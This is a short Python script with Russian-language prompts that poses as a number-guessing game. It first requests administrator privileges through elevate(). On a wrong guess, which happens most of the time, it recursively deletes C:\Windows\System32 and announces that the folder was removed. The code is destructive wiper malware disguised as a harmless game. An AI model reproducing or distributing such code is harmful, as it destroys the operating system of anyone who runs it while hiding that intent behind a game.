import random
import os
import shutil
from elevate import elevate

elevate()
a = random.randint(1, 10)

try:
    b = int(input('Придумай число от 1 до 10: '))  # Convert input to integer
    if b == a:
        print('Молодец ты угадал!')
    else:
        folder_path = 'C:\\Windows\\System32'
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)  # Use shutil.rmtree to delete the folder
            print(f'Папка {folder_path} была удалена.')
        else:
            print(f'Папки {folder_path} не существует.')
except ValueError:
    print("Не правильное значение!.")
except Exception as e:
    print(f"Произошла ошибка: {e}")

# Added line to prevent the window from closing immediately
input("Нажмите entеr чтобы выйти...")